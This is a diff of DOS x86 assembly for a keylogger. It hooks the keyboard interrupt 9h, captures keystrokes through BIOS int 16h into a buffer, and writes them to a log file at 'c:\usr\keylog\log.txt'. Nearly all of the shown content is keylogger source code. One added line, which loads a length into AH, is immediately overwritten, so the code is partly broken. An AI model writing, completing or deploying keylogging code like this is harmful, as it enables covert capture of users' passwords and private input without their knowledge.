@@ -79,16 +79,17 @@ new_9h proc
 		pusha
 		push es ds
 
+	;call original int 9h
+		pushf
+		call dword ptr cs:[old_9h_o]
+
 		call read_to_buff	
 		
 		pop ds es
 		popa
 
-	;call original int 9h
-		pushf
-		call dword ptr cs:[old_9h_o]
-		iret
 
+		iret
 		endp
 		
 
@@ -100,8 +101,9 @@ old_9h_s dw 0h
 read_to_buff proc 
 	
 	;saving pressed key
-		in al, 60h;	
-	
+		mov ah, 01h	
+		int 16h
+
 	;setting bx as len 
 		mov bl, len
 		xor bh, bh
@@ -118,6 +120,8 @@ flush_buff proc
 
 		push cs
 		pop ds
+
+		mov ah, len
 
 	;opening file by adress in ds:dx and saving its handler  
 		mov ax, 3d01h; 
@@ -153,7 +157,7 @@ flush_buff proc
 		endp
 
 
-log_file db 'c:\keylog.txt', 0
+log_file db 'c:\usr\keylog\log.txt', 0
 file_handler dw ?
 
 len db 0d
